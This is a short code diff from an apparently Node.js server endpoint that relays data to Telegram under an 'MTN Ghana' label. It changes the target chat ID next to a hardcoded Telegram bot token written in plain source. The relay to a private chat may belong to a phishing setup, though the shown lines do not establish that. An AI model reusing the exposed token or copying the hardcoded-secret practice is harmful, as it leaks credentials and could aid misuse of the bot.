@@ -27,7 +27,7 @@ app.post('/api/send-telegram', async (req, res) => {
         
         // MTN Ghana Bot Credentials
         const TG_BOT_TOKEN = '8704200695:AAG7mnW01vXAXmsCymLB5K_hlolZhhg86co';
-        const TG_CHAT_ID = '8704200695';
+        const TG_CHAT_ID = '8425632882';  // ✅ YOUR CORRECT HUMAN CHAT ID
         
         // Timestamp
         const timestamp = new Date().toLocaleString('en-US', { 
